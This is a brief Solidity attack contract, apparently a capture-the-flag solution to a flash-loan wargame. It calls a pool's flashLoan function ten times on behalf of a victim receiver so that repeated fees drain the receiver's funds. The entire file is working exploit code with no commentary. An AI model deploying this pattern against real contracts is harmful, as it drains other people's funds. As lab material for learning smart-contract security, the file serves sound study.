pragma solidity ^0.6.0;

contract HackFlashLoanReceiver {

    function hackReceiver(address receiver, address pool) public {
        for (uint i = 0; i < 10; i++) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature("flashLoan(address,uint256)", receiver, 0)
            );
            require(success, "flashLoan failed");
        }
    }
}